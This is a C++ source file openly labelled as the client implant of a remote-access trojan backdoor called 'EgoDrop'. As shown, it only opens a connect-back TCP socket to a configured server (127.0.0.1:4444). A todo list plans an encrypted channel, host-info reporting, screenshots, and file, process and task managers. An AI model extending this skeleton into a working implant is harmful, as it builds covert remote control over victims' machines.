/*
///---------------[ README ]---------------\\\

Name: EgoDrop RAT backdoor client(Implant).
Author: ISSAC

Todo:
Establish TCP socket connection.
Establish encrypted TCP channel.
Send info.
Test ping.
FileMgr.
ProcMgr.
TaskMgr.

Done:


///---------------[ README ]---------------\\\
*/

///---------------[ Library ]---------------\\\

#include <iostream>
#include <cstring>
#include <string>
#include <unistd.h>

//Socket
#include <arpa/inet.h>

//Screenshot
#include "clsScreenshot.h"

#include "clsTools.h"

///---------------[ Library ]---------------\\\

#define g_szIP "127.0.0.1" //Server IP
#define g_nPort 4444 //Server Port

using namespace std;


int main()
{
    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    if (sktSrv < 0)
    {
        fnLogError("Socket creation failed.");
        return 1;
    }

    sockaddr_in srvAddr{};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(g_nPort);
    if (inet_pton(AF_INET, g_szIP, &srvAddr.sin_addr) <= 0)
    {
        fnLogError("Invalid IPv4 address.");
        return 1;
    }

    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {
        char acStr[100];
        snprintf(acStr, sizeof(acStr) - 1, "Failed to connect to %s:%d", g_szIP, g_nPort);
        fnLogError(acStr);
    }

    return 0;
}